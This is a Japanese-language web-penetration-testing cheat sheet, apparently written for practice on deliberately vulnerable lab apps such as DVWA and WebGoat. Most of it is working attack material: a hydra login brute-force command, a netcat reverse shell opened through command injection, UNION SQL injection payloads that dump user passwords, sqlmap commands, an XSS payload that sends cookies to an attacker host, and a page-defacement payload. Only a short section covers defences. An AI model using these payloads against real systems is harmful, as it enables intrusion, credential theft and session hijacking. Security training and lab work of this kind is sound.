# Web アプリケーション侵入

## hydra で Web ログイン画面をブルートフォース

https://github.com/vanhauser-thc/thc-hydra

```shell
hydra <targetIP> http-post-form "/owaspbricks/login-3/index.php:username=^USER^&password=^PASS^&Login=submit:Wrong user name or password." -L http_default_users.txt -P http_default_pass.txt
```

## コマンドインジェクション（netcat でシェルを起動）

### １．攻撃マシンで Listen

```shell
nc -lvp <port>
```

### ２．コマンドインジェクションで攻撃マシンに接続

```shell
nc.traditional -e /bin/bash <ip> <port>
```

### 回数指定で ping を実行する（コマンドインジェクションのとき永久に ping し続けないように）

```shell
ping <ip> -c 3
```

## SQL インジェクション

information_schema を使ったスキーマ取得（SQL 標準だが Oracle は構造が異なる。SQLite には機能がない）

### DB 名

```sql
1' union select schema_name, 2 from information_schema.schemata #
```

### テーブル名

```sql
1' union select table_name, 2 from information_schema.tables where TABLE_SCHEMA <> 'information_schema' #
```

### 特定テーブルの列名

```sql
1' union select column_name, column_type from information_schema.columns where table_name = 'users' #
```

### 列数が限られている場合に、多くの情報を出力する例

```sql
1' union select concat(user_id, '-', first_name, ' ', last_name), concat(user, ':', password) from dvwa.users #
```

## SQLmap

### URL にパラメータが含まれる例

```shell
sqlmap -u "http://192.168.11.12/mutillidae/index.php?page=user-info.php&username=aaa&password=bbb&user-info-php-submit-button=View+Account+Details" -p username --schema
```

### POST データにパラメータが含まれる例

```shell
sqlmap -u "http://192.168.11.12/WebGoat/attack?Screen=71&menu=1100" \
--method POST \
--data "employee_id=101&password=aaa&action=Login" \
--cookie "acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=iaml1rtui5cfcjvsrc504g0t6; JSESSIONID=FEA4D26D5A2B7C42D53D2216D29D7B3" \
--header "Authorization: Basic d2ViZ29hdDp3WJnb2F0" \
--level 1 --risk 1 \
-p "password"
```

## XSS

### Cookie を外部に送信する例

```js
<script>document.write('<img src="http://<attacker ip>:8888/' + document.cookie + '">')</script>
```

### 対策

- 全てのユーザー入力をエンコードする（最重要）
- Cookie 作成時、HttpOnly 属性を付ければ、js から Cookie にアクセスできなくなる
- HTTP ヘッダーの CSP 設定で、img の外部取得を禁止できる

```http
Content-Security-Policy: img-src 'self';
```

### 確認用に簡易 Web サーバーを起動

```shell
python -m http.server 8888
```

### HTML コードの変更

```html
<img src="x" onerror="document.body.innerHTML='<h1>Hacked</h1>'" />
```

## xsser

XSS 脆弱性を自動的に検出するツール  
https://github.com/epsylon/xsser

```shell
xsser -u http://192.168.11.12 -g /bodgeit/search.jsp?q=XSS
```

## セキュリティ視点の結論

- インジェクション系の対策は、ユーザー入力を全て URL エンコードする。これに尽きる。
- Web サーバー上に機密ファイルを置かないこと
- Cookie に HttpOnly 属性を付けたらスクリプトから参照できない
- img の外部取得を禁止するのもセキュリティ的に有効
